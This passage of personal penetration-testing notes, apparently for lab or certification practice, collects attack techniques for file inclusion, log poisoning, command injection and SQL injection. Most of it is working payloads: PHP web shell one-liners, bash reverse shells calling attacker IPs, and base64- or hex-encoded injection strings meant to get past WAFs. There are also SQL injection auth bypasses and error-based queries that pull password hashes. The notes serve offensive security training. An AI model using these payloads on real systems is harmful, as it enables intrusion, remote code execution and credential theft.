its an LFI with SMTP its possible to get a reverse shell with comboing these two somehow. ippsec.rocks explained it once. keep in mind</span></p><p></p><p><span style="color:#3f4043;">random other lfi to rce:</span></p><p><a href="https://www.techsec.me/2020/09/local-file-inclusion-to-rce.html">https://www.techsec.me/2020/09/local-file-inclusion-to-rce.html</a> (/proc/self/fd)</p><p></p><p></p><p></p><p><h2>RFI to RCE</h2></p><p><a href="https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/">https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/</a></p><p><a href="https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/">https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/</a></p><p></p><p>This will give you a webshell:</p><p><span style="color:#3f4043;">shell.php</span></p><p></p><p>&lt;?=`$_GET[cmd]`?&gt;</p><p><span style="color:#3f4043;">or</span></p><p>&lt;?=`$_REQUEST[cmd]`?&gt;</p><p>or</p><p>&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;<code></code></p><p><code></code></p><p>http://example.com/x.php?0=echo &#39;&lt;?php shell_exec($_REQUEST[&quot;0&quot;]);?&gt;&#39; &gt; /var/www/htdocs/nutilabor/ind3x.php</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><a href="http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&0=dir">http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&amp;cmd=dir</a></p><p></p><p></p><p><span style="color:#3f4043;">===================</span></p><p></p><p><span style="color:#3f4043;">php payload examples: (test several, as certain functions might be blacklisted)</span></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php</a></p><p><span style="color:#3f4043;">If the exec or system functions in php is blacklisted, this might be able to work:</span></p><p></p><p><span style="color:#3f4043;">rev.php</span></p><p></p><p>&lt;?php</p><p>// Executes, returns the entire output as a string</p><p>echo shell_exec(&quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.119.220/443 &lt;&amp;1&#39;&quot;);</p><p>?&gt;</p><p></p><p><span style="color:#3f4043;">Sometimes </span>&amp; <span style="color:#3f4043;">works better than</span> ?<span style="color:#3f4043;">, interesting enough.</span></p><p><a href="http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php&cmd=id">http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php&amp;cmd=id</a></p><p></p><p></p><p></p><p>&lt;?php echo shell_exec($REQUEST[&quot;cmd&quot;]); exit; ?&gt;     </p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--LFI_locations_448.html"></a><h1 class='title level-6'>LFI locations</h1><br/><p><a href="https://pentesting.one2bla.me/enumeration/web-enumeration/lfi-rfi">https://pentesting.one2bla.me/enumeration/web-enumeration/lfi-rfi</a></p><p>LFI: </p><p>/etc/apache2/.htpasswd</p><p>/etc/apache2/htpasswd</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--Wrappers_462.html"></a><h1 class='title level-6'>Wrappers</h1><br/><p><span style="color:#3f4043;">Base64 encode LFI (Gets around filters sometimes)</span></p><p>http://10.10.99.193/lab1.php?file=php://filter/convert.base64-encode/resource=welcome.php</p><p>http://10.10.99.193/lab1.php?file=php://filter/convert.base64-encode/resource=welcome.php%00</p><p></p><p><span style="color:#3f4043;">POC print text:</span></p><p>http://10.10.99.193/lab1.php?file=data:text/plain,helloss</p><p></p><p><span style="color:#3f4043;">Command Injection:</span></p><p>10.10.99.193/lab1.php?file=data:text/plain,&lt;?php echo shell_exec(&#39;dir&#39;)?&gt;</p><p></p><p><span style="color:#3f4043;">Web shell: </span></p><p>10.10.99.193/lab1.php?file=data:text/plain,&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&amp;cmd=id</p><p>10.10.99.193/lab1.php?file=data:text/plain,&lt;?php echo shell_exec($_REQUEST[&#39;cmd&#39;]); ?&gt;&amp;cmd=id</p><p></p><p><span style="color:#3f4043;">From here, use the bash reverse shell script after cmd= (Make sure to catch the request in burp, and URL DECODE ONLY THE PAYLOAD AFTER CMD= FULLT, and then URL ENCODE AGAIN only once. If not, it will likely not work.)</span></p><p></p><p>GET /lab1.php?file=data:text/plain,%3C?php%20echo%20shell_exec($_REQUEST[%27cmd%27]);%20?%3E&amp;cmd=bash+-c+&#39;exec+bash+-i+%26&gt;/dev/tcp/10.13.4.2/443+&lt;%261&#39;</p><p>===========</p><p></p><p>This is Superior:</p><p></p><p>wget <a href="https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py">https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py</a></p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php shell_exec($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php system($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php echo shell_exec($_GET[&#39;0&#39;]);?&gt;&#39;</p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php echo shell_exec($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--Wrappers--Filter_Chain_-_LFI2RCE_542.html"></a><h1 class='title level-7'>Filter Chain - LFI2RCE</h1><br/><p>wget <a href="https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py">https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py</a></p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php shell_exec($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php system($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?=`$_GET[0]`?&gt;&#39;</p><p></p><p>python3 php_filter_chain_generator.py --chain &#39;&lt;?php echo shell_exec($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--SMTP_+_RFI_=_RCE_386.html"></a><h1 class='title level-6'>SMTP + RFI = RCE</h1><br/><p>Upload a php cmd paramater through SMTP, and if we can access it through LFI we&#39;ll get command injection</p><p><img src="images/386-1.png" alt="images/386-1.png" /></p><p></p><p>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=ping -c4 192.168.1.42</p><p></p><p>tcpdump -i tun0 icmp</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--SSH_and_LFI_log_poisoning_417.html"></a><h1 class='title level-6'>SSH and LFI log poisoning</h1><br/><p><a href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</a></p><p></p><p><span style="color:#3f4043;">Fuzzing application:</span></p><p>ffuf -c -u &#39;<a href="http://192.168.1.136/sea.php?file=../../../../../../FUZZ'">http://192.168.1.136/sea.php?file=../../../../../../FUZZ&#39;</a> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -b &#39;PHPSESSID=russhgsf2b2asdt3rm4jr4o50l&#39; -fl 21</p><p><img src="images/417-1.png" alt="images/417-1.png" /></p><p></p><p><a href="http://192.168.1.136/sea.php?file=../../../../../var/log/auth">http://192.168.1.136/sea.php?file=../../../../../var/log/auth</a></p><p></p><p>ssh ssh &#39;&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&#39;@192.168.1.136</p><p></p><p><a href="http://192.168.1.136/sea.php?file=../../../../../var/log/auth&cmd=id">http://192.168.1.136/sea.php?file=../../../../../var/log/auth&amp;cmd=id</a></p><p></p><p><img src="images/417-2.png" alt="images/417-2.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--HTTP_and_LFI_poisoning_443.html"></a><h1 class='title level-6'>HTTP and LFI poisoning</h1><br/><p><span style="color:#3f4043;">You can poison the log file with malicous php code in user agent like so:</span></p><p></p><p>curl <a href="http://10.10.129.12">http://10.10.129.12</a> -A &#39;&lt;?php echo shell_exec($_REQUEST[&#39;0&#39;]);?&gt;&#39;</p><p></p><p><a href="http://10.10.129.12/?view=dog../../../../../../../../../../../../../var/log/apache2/access.log&ext=&0=id">http://10.10.129.12/?view=dog../../../../../../../../../../../../../var/log/apache2/access.log&amp;ext=&amp;0=id</a></p><p><img src="images/443-1.png" alt="images/443-1.png" /></p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">This technique also works:</span></p><p>rlwrap nc -nv 10.10.129.12 80</p><p>&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;</p><p><img src="images/443-2.png" alt="images/443-2.png" /></p><p></p><p></p><p></p><p><a href="https://cdn.discordapp.com/attachments/802238101526806558/1035250413907226734/unknown.png"><img src="images/443-3.png" alt="images/443-3.png" /></a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--FTP_LFI_RCE_449.html"></a><h1 class='title level-6'>FTP LFI RCE</h1><br/><p><span style="color:#3f4043;">Keep in mind you can reach FTP location through LFI, so if you have access to FTP you can get a shell that way </span></p><p></p><p>/var/log/vsftpd.log</p><p></p><p>You can also try to poison the logs through malicous username requests</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--LFI-RFi--LFI_phpinfo()_Race_Condition_RCE_450.html"></a><h1 class='title level-6'>LFI phpinfo() Race Condition RCE</h1><br/><p><a href="https://youtu.be/rs4zEwONzzk?t=825">https://youtu.be/rs4zEwONzzk?t=825</a></p><p></p><p><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo">https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Command_injection_359.html"></a><h1 class='title level-5'>Command injection</h1><br/><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands</a></p><p><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p><p><a href="https://youtu.be/nrvLJn7B5iI?t=326">https://youtu.be/nrvLJn7B5iI?t=326</a></p><p></p><p>Automated tool:</p><p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a></p><p></p><p><span style="color:#3f4043;text-decoration:underline;">Essentially everytime you see a place that has a paramater, accepts user input, or has a functionality that seems like its running some sort of OS commands, then attempt command injection on it.</span></p><p></p><p></p><p><span style="color:#3f4043;">Common places to find:</span></p><p><ul><li>Web application forms (e.g. login forms, search forms)</li><li>Query parameters in URLs</li><li>HTTP headers (e.g. User-Agent, Referer)</li><li>Cookies</li><li>File upload forms</li><li>Any other location where user input is passed to the system shell or interpreter</li></ul></p><p></p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">In case of blind command injection example:</span></p><p><img src="images/359-1.png" alt="images/359-1.png" /></p><p>productId=1 <span style="color:#ed333b;">&amp; ping -c 4 10.13.31.108 #</span>&amp;storeId=1</p><p><span style="color:#3f4043;">(and on our kali we can see icmp traffic, so confirm we have command injection)</span></p><p>tcpdump -i tun0 icmp</p><p></p><p><span style="color:#3f4043;">Paramater fuzzing:</span></p><p>ffuf -u ‘<a href="https://172.31.3.1/forum.chatlogs/chatlogs.php?FUZZ=id">https://10.10.42.12/chat/blankpage.php?FUZZ=id</a>’ -w <span style="color:#000000;">/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span></p><p></p><p><span style="color:#3f4043;">Injection fuzzing:</span></p><p>ffuf -u &#39;<a href="https://10.10.42.12/chat/blankpage.php?cmd=FUZZ">https://10.10.42.12/chat/blankpage.php?cmd=FUZZ</a>&#39; -w <span style="color:#000000;">/usr/share/seclists/Fuzzing/command-injection-commix.txt</span></p><p></p><p><span style="color:#3f4043;">Authenticated post request Injection fuzzing:</span></p><p>wfuzz -w command_injection.txt -c -u &#39;<a href="http://127.0.0.1/DVWA/vulnerabilities/exec/#'">http://127.0.0.1/DVWA/vulnerabilities/exec/#&#39;</a> -d &#39;ip=FUZZ&amp;Submit=Submit&#39; -L -b &quot;PHPSESSID=st2hjp4hddi9ob16untqj62s65; security=low&quot;</p><p></p><p></p><p>ffuf -u &#39;<a href="http://10.10.185.73/assets/php/search.php'">http://10.10.185.73/assets/php/search.php&#39;</a> -w c2 -H &#39;Authorization: Basic cmFzY2FsOmR1c3R5MQ==&#39; -d &#39;{&quot;target&quot;:&quot;FUZZ&quot;}&#39; -X POST -x <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Command_injection--custom_list_590.html"></a><h1 class='title level-6'>custom list</h1><br/><p>;whoami;</p><p>;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash;</p><p>\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash; \&quot;</p><p>\&quot;;echo YHNsZWVwIDEwYAo=|base64 -d|bash; \&quot;</p><p>\&quot;;echo c2xlZXAgMTAK|base64 -d|bash; \&quot;</p><p>\&quot;;echo c2xlZXAgMTAK|base64 -d|bash; \&quot;</p><p>;system(&#39;ping%20-c1%2010.13.4.2&#39;)</p><p>;system(&#39;ping -c1 10.13.4.2&#39;)</p><p>&amp;&amp;sleep 4|</p><p>|`sleep 10`</p><p>;`sleep 10`;</p><p>&amp;&amp;`sleep 10`;</p><p>&amp;&amp;`sleep 10`#</p><p>;sleep 10#</p><p>\&quot;;`sleep 20`; \&quot;</p><p>echo d2dldCBodHRwOi8vMTAuMTMuNC4yL3RlZWhlZQo | base64 -d |bash|</p><p>&quot;\;echo d2dldCBodHRwOi8vMTAuMTMuNC4yL3RlZWhlZQo | base64 -d |bash; \&quot;</p><p></p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Command_injection--JSON_Command_Injection_591.html"></a><h1 class='title level-6'>JSON Command Injection</h1><br/><p><img src="images/591-1.png" alt="images/591-1.png" /></p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p></p><p><img src="images/591-2.png" alt="images/591-2.png" /></p><p></p><p><img src="images/591-3.png" alt="images/591-3.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Command_injection--JSON_Command_Injection--examples_592.html"></a><h1 class='title level-7'>examples</h1><br/><p>POST /submit HTTP/1.1</p><p>Host: example.com</p><p>Content-Type: application/json</p><p></p><p>{</p><p>  &quot;field1&quot;: &quot;value1&quot;,</p><p>  &quot;field2&quot;: &quot;uname -a\x3b\x70\x69\x6e\x67\x20\x2d\x63\x20\x32\x20\x31\x30\x2e\x31\x33\x2e\x33\x31\x2e\x34\x32\x3b&quot;,</p><p>  &quot;field3&quot;: &quot;value3&quot;</p><p>}</p><p></p><p><span style="color:#c061cb;">=========</span></p><p></p><p>POST /example/json </p><p>HTTP/1.1 Host: example.com </p><p>Content-Type: application/json</p><p></p><p>{ &quot;param1&quot;: &quot;value1&quot;, &quot;param2&quot;: &quot;value2&quot;, &quot;param3&quot;: &quot;3b70696e67202d63322031302e31332e33312e34323b&quot; }</p><p></p><p><span style="color:#c061cb;">=========</span></p><p></p><p><span style="color:#3f4043;">You can use Burp Suite to send a request with a payload of &quot;\;ping -c 2 10.13.31.42;&quot;, encoded in hexadecimal, to test for a command injection vulnerability. Here is an example request and payload:</span></p><p></p><p>POST /example/json HTTP/1.1 Host: example.com Content-Type: application/json</p><p></p><p>{ &quot;param1&quot;: &quot;value1&quot;, &quot;param2&quot;: &quot;value2&quot;, &quot;param3&quot;: &quot;5c3b70696e67202d63322031302e31332e33312e34323b&quot; }</p><p></p><p><span style="color:#3f4043;">The payload, &quot;5c3b70696e67202d63322031302e31332e33312e34323b&quot; is the hexadecimal representation of &quot;\;ping -c 2 10.13.31.42;&quot;. Escaping the payload can be useful in this context if the application is using a web application firewall (WAF) that is configured to block requests containing special characters. By escaping the payload, the request might be able to bypass the WAF and the command injection vulnerability might be exploitable</span></p><p></p><p><span style="color:#c061cb;">======</span></p><p></p><p>POST /example/json HTTP/1.1 </p><p>Host: example.com</p><p>Content-Type: application/json </p><p></p><p>{ </p><p>&quot;param1&quot;: &quot;value1&quot;,</p><p> &quot;param2&quot;: &quot;value2&quot;,</p><p> &quot;param3&quot;: &quot;\&quot;3b70696e67202d63322031302e31332e33312e34323b\&quot;&quot;</p><p>}</p><p></p><p><span style="color:#c061cb;">======</span><span style="color:#c061cb;"></span></p><p><span style="color:#c061cb;"></span><span style="color:#c061cb;"></span></p><p><span style="color:#c061cb;"></span><h3>Thoughts on this payload? Json post request to get command injeciton. Hex to potentially get around waf. Would it be good, or is there something wrong or even inefficient in it?</h3></p><p></p><p>POST /example/json HTTP/1.1 </p><p>Host: uwu.com</p><p>Content-Type: application/json </p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p></p><p></p><p></p><p>==========</p><p></p><p></p><p></p><p><h3>Thoughts on this payload? Json post request to get command injeciton. Hexadecimal to potentially get around waf. Would it be good, or is there something wrong or even inefficient in it?</h3></p><p></p><p>POST /example/json HTTP/1.1 </p><p>Host: uwu.com</p><p>Content-Type: application/json </p><p></p><p>{</p><p>&quot;target&quot;: &quot;\&quot;;bash -c bash -i &gt;&amp; /dev/tcp/10.13.31.42/443 0&gt;&amp;1; \&quot;&quot;</p><p>}</p><p></p><p></p><p>==</p><p><h3>Thoughts on this payload? Json post request to get command injeciton. Hexadecimal to potentially get around waf. Would it be good, or is there something wrong or even inefficient in it?</h3></p><p></p><p>POST /example/json HTTP/1.1 </p><p>Host: uwu.com</p><p>Content-Type: application/json </p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;0x3b0x620x610x730x680x200x2d0x630x200x620x610x730x680x200x2d0x690x200x3e0x260x200x2f0x640x650x760x2f0x740x630x700x2f0x310x300x2e0x310x330x2e0x330x310x2e0x340x320x2f0x340x340x330x200x300x3e0x260x310x3b \&quot;&quot;</p><p>}</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI_273.html"></a><h1 class='title level-5'>SQLI</h1><br/><p></p><p><a href="https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1">https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1</a></p><p><a href="https://vk9-sec.com/advanced-sql-injection-union-based/">https://vk9-sec.com/advanced-sql-injection-union-based/</a></p><p></p><p><span style="color:#3f4043;">For auth bypass, see:</span> Fuzzing SQLI</p><p></p><p><span style="color:#3f4043;">Find injection point. Could be something like this to break query  &#39;</span></p><p></p><p><span style="color:#3f4043;">Then identify columns</span></p><p></p><p><span style="color:#3f4043;">Example to identify columns with simple injection point added:</span></p><p></p><p>&#39;UNION ALL SELECT 1;--</p><p>&#39;UNION ALL SELECT 1,2;--</p><p>&#39;UNION ALL SELECT 1,2,3;--</p><p></p><p><span style="color:#3f4043;">Here a list you could take some from for fuzzing, but remember inject point</span></p><p><a href="https://github.com/payloadbox/sql-injection-payload-list#generic-union-select-payloads">https://github.com/payloadbox/sql-injection-payload-list#generic-union-select-payloads</a> </p><p></p><p><span style="color:#3f4043;">Next you want more info no the target. Are you sysadmin? Which database versoin is running? What&#39;s inside the database? Anything valuable?</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Can you enable xp_cmdshell? Can you do stack based queries? Can you execute stack based queries through xp_cmdshell? If so, then you can likely trigger the ps1 script to get shell.</span></p><p></p><p></p><p><span style="color:#3f4043;">MSSQL Injection:</span></p><p></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md</a></p><p><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><p></p><p><span style="color:#3f4043;">Error-based SQLI: (The hole point with error based injection is that the SQL backend will error out some information about your query that&#39;s “wrong&quot;, and by using this to our adventage we can force this logic to spit out valuable information to us.)</span></p><p></p><p>&#39;, cast((SELECT @@version) as int)) --</p><p>&#39;, cast((SELECT db_name(1)) as int)) --</p><p></p><p><span style="color:#3f4043;">(Note: In this case I could only really enumarate one datapoint at a time, so I had to do something like this to make it work)</span></p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --</p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM master.information_schema.TABLES) as int)) --</p><p>&#39;, cast((SELECT top 1 username FROM users) as int)) --</p><p>&#39;, cast((SELECT top 1 username FROM users where username not in(&#39;eric&#39;)) as int)) --</p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --</p><p></p><p><span style="color:#3f4043;">(Note: You can do it like this too. I might prefer this variation of syntax actually.)</span></p><p>1&#39;,CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES )))--</p><p>1&#39;,CONVERT(INT,(SELECT  top 1  COLUMN_NAME FROM archive.information_schema.COLUMNS WHERE TABLE_NAME=&#39;pmanager&#39;)))--</p><p>1&#39;,CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES WHERE TABLE_NAME NOT IN (&#39;pmanager&#39;))))--</p><p>1&#39;,CONVERT(INT,(SELECT DISTINCT top 1 COLUMN_NAME FROM archive.information_schema.COLUMNS  WHERE TABLE_NAME=&#39;pmanager&#39; AND column_name NOT IN (&#39;alogin&#39;, &#39;id&#39;))))</p><p>1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--</p><p><img src="images/273-1.png" alt="images/273-1.png" /></p><p> 1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN (&#39;7de6b6f0afadd89c3ed558da43930181&#39;))))--</p><p> <img src="images/273-2.png" alt="images/273-2.png" /></p><p>  1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN (&#39;7de6b6f0afadd89c3ed558da43930181&#39;, &#39;5b413fe170836079622f4131fe6efa2d&#39;))))--</p><p>  <img src="images/273-3.png" alt="images/273-3.png" /></p><p>  </p><p><span style="color:#3f4043;">  etc etc... Again, we could only get one datapoint at a time, so doing it this way works.</span></p><p>  </p><p>  </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--Auth_bypass_353.html"></a><h1 class='title level-6'>Auth bypass</h1><br/><p><a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads</a></p><p></p><p>&#39; or 1=1 --</p><p>admin&#39;  or 1=1 or &#39;&#39;=&#39;</p><p>admin&#39; --</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--Error_based_351.html"></a><h1 class='title level-6'>Error based</h1><br/><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based</a></p><p></p><p>&#39; + convert(int,@@version) + &#39;</p><p>&#39; + cast((SELECT @@version) as int) + &#39;</p><p></p><p>&#39; + convert(int,db_name(1)) + &#39;</p><p>&#39; + convert(int,db_name(2)) + &#39;</p><p>&#39; + cast((SELECT db_name(1)) as int) + &#39;</p><p>&#39; + cast((SELECT db_name(2)) as int) + &#39;</p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Error-based SQLI: (The hole point with error based injection is that the SQL backend will error out some information about your query that&#39;s “wrong&quot;, and by using this to our adventage we can force this logic to spit out valuable information to us.)</span></p><p></p><p>&#39;, cast((SELECT @@version) as int)) --</p><p>&#39;, cast((SELECT db_name(1)) as int)) --</p><p></p><p><span style="color:#3f4043;">(Note: In this case I could only really enumarate one datapoint at a time, so I had to do something like this to make it work)</span></p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --</p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM master.information_schema.TABLES) as int)) --</p><p>&#39;, cast((SELECT top 1 username FROM users) as int)) --</p><p>&#39;, cast((SELECT top 1 username FROM users where username not in(&#39;eric&#39;)) as int)) --</p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --</p><p></p><p><span style="color:#3f4043;">(Note: You can do it like this too. I might prefer this variation of syntax actually.)</span></p><p>1&#39;,CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES )))--</p><p>1&#39;,CONVERT(INT,(SELECT  top 1  COLUMN_NAME FROM archive.information_schema.COLUMNS WHERE TABLE_NAME=&#39;pmanager&#39;)))--</p><p>1&#39;,CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES WHERE TABLE_NAME NOT IN (&#39;pmanager&#39;))))--</p><p>1&#39;,CONVERT(INT,(SELECT DISTINCT top 1 COLUMN_NAME FROM archive.information_schema.COLUMNS  WHERE TABLE_NAME=&#39;pmanager&#39; AND column_name NOT IN (&#39;alogin&#39;, &#39;id&#39;))))</p><p>1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--Error_based--Example_352.html"></a><h1 class='title level-7'>Example</h1><br/><p><span style="color:#3f4043;">(Note: In this case I could only really enumarate one datapoint at a time, so I had to do something like this to make it work)</span></p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --</p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM master.information_schema.TABLES) as int)) --</p><p>&#39;, cast((SELECT top 1 username FROM users) as int)) --</p><p>&#39;, cast((SELECT top 1 username FROM users where username not in(&#39;eric&#39;)) as int)) --</p><p>&#39;, cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --</p><p></p><p><span style="color:#3f4043;">(Note: You can do it like this too. I might prefer this variation of syntax actually.)</span></p><p>1&#39;,CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES )))--</p><p>1&#39;,CONVERT(INT,(SELECT  top 1  COLUMN_NAME FROM archive.information_schema.COLUMNS WHERE TABLE_NAME=&#39;pmanager&#39;)))--</p><p>1&#39;,CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES WHERE TABLE_NAME NOT IN (&#39;pmanager&#39;))))--</p><p>1&#39;,CONVERT(INT,(SELECT DISTINCT top 1 COLUMN_NAME FROM archive.information_schema.COLUMNS  WHERE TABLE_NAME=&#39;pmanager&#39; AND column_name NOT IN (&#39;alogin&#39;, &#39;id&#39;))))</p><p>1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--</p><p><img src="images/352-1.png" alt="images/352-1.png" /></p><p> 1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN (&#39;7de6b6f0afadd89c3ed558da43930181&#39;))))--</p><p> <img src="images/352-2.png" alt="images/352-2.png" /></p><p>  1&#39;,CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN (&#39;7de6b6f0afadd89c3ed558da43930181&#39;, &#39;5b413fe170836079622f4131fe6efa2d&#39;))))--</p><p>  <img src="images/352-3.png" alt="images/352-3.png" /></p><p>  </p><p><span style="color:#3f4043;">  etc etc... Again, we could only get one datapoint at a time, so doing it this way works.</span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SQLI--Oracle_354.html"></a><h1 class='title level-6'>Oracle</h1><br/><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md</a></p><p></p><p><span style="color:#3f4043;">Determine the number of 